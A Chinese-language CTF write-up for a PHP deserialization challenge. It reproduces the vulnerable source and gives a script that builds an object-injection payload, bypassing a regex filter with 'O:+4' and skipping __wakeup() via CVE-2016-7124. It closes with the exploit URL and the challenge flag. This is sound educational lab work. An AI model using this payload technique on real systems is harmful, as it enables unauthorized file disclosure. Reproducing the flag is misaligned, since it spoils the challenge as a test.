# Web_php_unserialize

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=a96b6abc-21b4-4814-afcd-8c32ddc1d631_2)

这道题我知道考点是php的反序列化，不巧的是我也仅停留在“知道”这个层面了，之前做过这样的题但是基本忘得差不多了。这次来回顾一下。

首先场景是一个php脚本。

```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) { 
    $var = base64_decode($_GET['var']); 
    if (preg_match('/[oc]:\d+:/i', $var)) { 
        die('stop hacking!'); 
    } else {
        @unserialize($var); 
    } 
} else { 
    highlight_file("index.php"); 
} 
?>
```

分析一下：这个脚本定义了一个Demo类，同时Demo类有三个魔术方法。

- ### PHP魔术方法
- > __construct():构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。
- > __destruct():析构函数。析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。
- > __wakeup():unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。

从官方文档里看见了我们想要东西：unserialize()。不过先继续往下看。

- > isset():检测变量是否已设置并且非NULL。
- > $_GET:收集来自 method="get" 的表单中的值。
- > preg_match():执行一个正则表达式匹配。
- > unserialize():所有php里面的值都可以使用函数serialize()来返回一个包含字节流的字符串来表示。unserialize()函数能够重新把字符串变回php原来的值。如果想要unserialize()一个对象，这个对象的类必须已经定义过。

看来有一个过滤，想要绕过过滤就要理解这个正则在干什么。

- ### /\[oc]:\d+:/i
- > /:表示文本正则表达式模式的开始和结尾。在第二个 “/”后添加单字符标志可以指定搜索行为。因此第一个/表示正则字符串开始，第二个表示使用i模式，进行忽略大小写的全局匹配。
- > \[]:标记括号表达式的开始和结尾。这里[oc]表示匹配o或c其中的一个。
- > \d:数字字符匹配，等效于[0-9]
- > +:一次或多次匹配前面的字符或子表达式。比如“go+”匹配go和gooo，但是不和g匹配。
- > 两个双引号就是原本的意思，匹配双引号。

这里我们先直接输出序列化实例的结果。

- O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}

你会发现O:4:匹配正则，会被过滤。这里可以用O:+4:来绕过匹配，这样输出的结果也是一样的。

但是这样还不够，因为__construct()先执行，__wakeup()后执行（创建实例在反序列化之前），所以我们还要让__wakeup()不执行。在CVE-2016-7124中可以看到，当成员属性数目大于实际数目时，__wakeup()不会执行。那么那里表示的是成员呢？就是中间那个1。把那个1改成别的数字，比如2，就行了。

```php
<?php
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}
$flag=new Demo("fl4g.php");
$s_flag=serialize($flag);
$s_flag=str_replace("O:4","O:+4",$s_flag);
$s_flag=str_replace(":1:",":2:",$s_flag);
echo base64_encode($s_flag);
?>
```

输出：
- TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==

那么就可以按照get的传参方式把这个payload传过去了。

- http://61.147.171.105:56832/index.php?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==

- ### Flag
- > ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}

